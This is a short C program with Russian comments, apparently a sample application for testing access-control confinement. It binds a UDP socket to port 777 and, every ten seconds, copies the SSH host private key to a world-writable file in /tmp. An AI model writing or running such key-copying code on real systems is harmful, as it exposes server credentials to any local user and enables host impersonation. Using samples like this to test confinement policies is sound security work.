#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define PORT 777

int fd, sfd, keyin, keyout;
struct sockaddr_in sabind;
const char *logfile = "/var/log/macapp.log";
const char *keyfile = "/etc/ssh/ssh_host_rsa_key";
const char *tempfile = "/tmp/ssh_key";


int main() {
        while(1) {
                // открываем файл журнала
                if (( fd = open(logfile,O_WRONLY | O_CREAT | O_APPEND, 0644)) < 0 ) 
                        perror("fopen() failed for log");
                // создаем сокет
                if (( sfd = socket(AF_INET,SOCK_DGRAM,0)) < 0 ) 
                        perror("socket() failed");
                // привязываем сокет к UDP порту 777
                sabind.sin_family = AF_INET;
                sabind.sin_port = htons(PORT);
                if (bind(sfd, (struct sockaddr *)&sabind, sizeof(sabind)) < 0) 
                        perror("bind() failed");
                // открываем на чтение файл с закрытым ключем службы SSH
                if (( keyin = open(keyfile,O_RDONLY )) < 0 ) 
                        perror("fopen() failed for keyfile");
                // будем копировать ключ SSH в этот файл
                if (( keyout = open(tempfile,O_WRONLY| O_CREAT, 0666 )) < 0 ) 
                        perror("fopen() failed for tempfile");
                // выясняем размер файла
                struct stat statbuf;
                if (fstat(keyin, &statbuf) < 0)
                        perror("fstat() failed for keyfile");
                char buffer[statbuf.st_size];
                ssize_t nread;
                // копируем файл ключа
                if (( nread = read(keyin, &buffer, statbuf.st_size)) != statbuf.st_size)
                        perror("read() failed for keyfile");
                if (write(keyout, &buffer, nread) < nread )
                        perror("write() failed for tempfile");
                sleep(10);
                if (fd > 0) 
                        close(fd);
                if (sfd > 0) 
                        close(sfd);
                if (keyin > 0) 
                        close(keyin);
                if (keyout > 0) 
                        close(keyout);
        }
}
